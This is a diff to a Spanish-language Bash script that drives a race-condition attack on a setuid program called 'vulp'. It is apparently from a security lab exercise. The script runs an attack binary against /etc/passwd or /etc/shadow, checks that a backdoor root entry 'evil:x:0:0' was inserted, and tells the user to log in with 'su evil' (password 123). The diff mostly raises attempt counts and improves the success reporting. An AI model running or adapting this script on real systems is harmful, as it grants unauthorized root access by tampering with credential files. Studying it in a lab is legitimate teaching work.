@@ -28,18 +28,16 @@ if [ "$SYMLINK_PROTECTION" = "1" ]; then
     fi
 fi
 
-# Función para ejecutar vulp con un archivo de entrada
 run_vulp() {
     local input_file=$1
     local count=0
-    while [ $count -lt 10000 ]; do
+    while [ $count -lt 100000 ]; do
         ./vulp < "$input_file" >/dev/null 2>&1
         sleep 0.01
         count=$((count + 1))
     done
 }
 
-# Función para monitorear un archivo hasta que cambie su mtime
 wait_for_change() {
     local file=$1
     local old_mtime=$(stat -c %Y "$file")
@@ -50,30 +48,41 @@ wait_for_change() {
     echo "[SUCCESS] $file fue modificado."
 }
 
-# Verifica argumentos
+# Modo /etc/passwd
 if [ "$1" = "-p" ]; then
     echo "[+] Ejecutando ataque a $PASSWD_FILE..."
     ./attack "$PASSWD_FILE" &
     ATTACK_PID=$!
+
     run_vulp evil_input.txt &
     VULP_PID=$!
-    sleep 10
-    if tail -5 "$PASSWD_FILE" | grep -q "evil:x:0:0"; then
-        echo "[SUCCESS] Entrada maliciosa encontrada en $PASSWD_FILE"
-    else
-        echo "[!] Entrada aún no encontrada. Puedes intentar nuevamente."
-    fi
-    kill $ATTACK_PID $VULP_PID 2>/dev/null
 
+    wait $ATTACK_PID
+
+    kill $VULP_PID 2>/dev/null
+
+    echo
+    if tail -5 "$PASSWD_FILE" | grep -q "evil:x:0:0"; then
+        echo "[✓] ¡Ataque exitoso! Entrada maliciosa detectada en $PASSWD_FILE"
+        tail -5 "$PASSWD_FILE" | grep "evil"
+        echo "Ahora puedes intentar: su evil"
+    else
+        echo "[✗] Ataque finalizó pero no se logró insertar entrada. Puedes volver a intentarlo."
+    fi
+
+# Modo /etc/shadow
 elif [ "$1" = "-s" ]; then
     echo "[+] Ejecutando ataque a $SHADOW_FILE..."
     ./attack "$SHADOW_FILE" &
     ATTACK_PID=$!
+
     run_vulp evil_input_shadow.txt &
     VULP_PID=$!
+
     wait_for_change "$SHADOW_FILE"
+
     kill $ATTACK_PID $VULP_PID 2>/dev/null
-    echo "Puedes intentar: su evil (contraseña: 123)"
+    echo "[✓] Ataque a $SHADOW_FILE completado. Intenta: su evil (contraseña: 123)"
 
 else
     echo "Uso: $0 -p  # Ataque a $PASSWD_FILE"
